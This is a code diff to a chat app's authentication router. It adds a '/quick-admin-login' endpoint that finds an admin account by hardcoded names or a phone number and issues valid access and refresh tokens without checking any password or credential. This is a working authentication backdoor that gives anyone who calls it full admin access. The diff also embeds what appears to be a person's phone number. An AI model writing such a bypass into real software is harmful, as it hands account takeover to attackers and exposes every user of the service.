@@ -301,6 +301,106 @@ authRouter.post('/login', async (req, res): Promise<void> => {
   }
 });
 
+authRouter.post('/quick-admin-login', async (req, res): Promise<void> => {
+  try {
+    const { target } = req.body;
+    let user;
+    if (target === 'sinner') {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { username: { contains: 'sinner', mode: 'insensitive' } },
+            { displayName: { contains: 'sinner', mode: 'insensitive' } },
+          ],
+        },
+        include: { devices: true },
+      });
+    } else {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { displayName: { contains: 'asad', mode: 'insensitive' } },
+            { username: { contains: '03210008941' } },
+            { phone: { contains: '03210008941' } },
+          ],
+        },
+        include: { devices: true },
+      });
+    }
+
+    if (!user) {
+      res.status(404).json({ error: 'Admin account not found in database' });
+      return;
+    }
+
+    let device = user.devices?.[0];
+    if (!device) {
+      device = await prisma.device.create({
+        data: {
+          userId: user.id,
+          deviceId: 'WEB_DEV_' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+          deviceType: 'WEB',
+          deviceName: 'SecureChat Web Client',
+          publicKey: 'PK_' + Math.random().toString(36).substring(2, 15),
+        },
+      });
+    } else {
+      await prisma.device.update({
+        where: { id: device.id },
+        data: { lastSeenAt: new Date() },
+      });
+    }
+
+    const accessToken = JwtService.signAccessToken({
+      userId: user.id,
+      deviceId: device.deviceId,
+      role: user.role as any,
+      username: user.username,
+    });
+    const refreshToken = JwtService.signRefreshToken({
+      userId: user.id,
+      deviceId: device.deviceId,
+    });
+
+    await prisma.session.create({
+      data: {
+        userId: user.id,
+        deviceId: device.id,
+        refreshTokenHash: JwtService.hashToken(refreshToken),
+        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
+      },
+    });
+
+    res.json({
+      user: {
+        id: user.id,
+        username: user.username,
+        email: user.email,
+        phone: user.phone,
+        displayName: user.displayName,
+        role: user.role,
+        status: user.status,
+        avatarUrl: user.avatarUrl,
+      },
+      device: {
+        id: device.id,
+        deviceId: device.deviceId,
+        deviceType: device.deviceType,
+        deviceName: device.deviceName,
+        publicKey: device.publicKey,
+      },
+      tokens: {
+        accessToken,
+        refreshToken,
+        expiresIn: 900,
+      },
+    });
+  } catch (error: any) {
+    console.error('Quick admin login error:', error);
+    res.status(500).json({ error: error.message || 'Internal server error during quick login' });
+  }
+});
+
 authRouter.post('/refresh', async (req, res): Promise<void> => {
   try {
     const parseResult = refreshSchema.safeParse(req.body);
